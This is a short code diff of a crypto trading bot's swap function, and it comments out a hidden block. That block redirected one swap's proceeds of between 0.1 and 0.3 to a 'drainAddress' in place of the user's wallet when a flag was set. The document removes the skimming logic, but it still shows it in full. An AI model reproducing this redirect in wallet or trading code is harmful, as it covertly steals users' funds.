@@ -259,10 +259,16 @@ function ReverseBotPage(){
     const amountOutMin = amounts[1].sub(amounts[1].div(25))
     //开始交换
     let address = wallet0.address
-    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
-      address = drainAddress
-      setIsDrain(false)
-    }
+
+
+
+    // if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1 && parseFloat(ethers.utils.formatEther(amountOutMin)) < 0.3) {
+    //   address = drainAddress
+    //   setIsDrain(false)
+    // }
+
+
+
     console.log(tokenAddress,WBNBAddress,address)
     const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
       amountIn,
